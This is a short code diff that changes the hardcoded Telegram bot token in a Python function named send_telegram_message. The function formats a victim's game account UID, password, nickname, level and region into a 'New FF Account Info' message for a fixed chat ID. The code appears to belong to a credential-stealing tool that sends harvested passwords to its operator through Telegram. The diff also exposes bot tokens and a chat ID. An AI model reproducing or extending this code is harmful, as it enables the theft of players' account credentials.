@@ -192,7 +192,7 @@ def fetch_player_info(account_id: str):
         return None
 
 def send_telegram_message(uid: str, password: str, nickname: str, level, region: str):
-    bot_token = "8622182891:AAFZrjBvj_iAMTOIXCnmd65tTzZENnB2_UQ"
+    bot_token = "8979665438:AAG4DGcncRKVx4708BNqoV-dR1YtOWWR1P8"
     chat_id = "7326248826"
     text = (f"🔹 New FF Account Info 🔹\n"
             f"UID: {uid}\n"
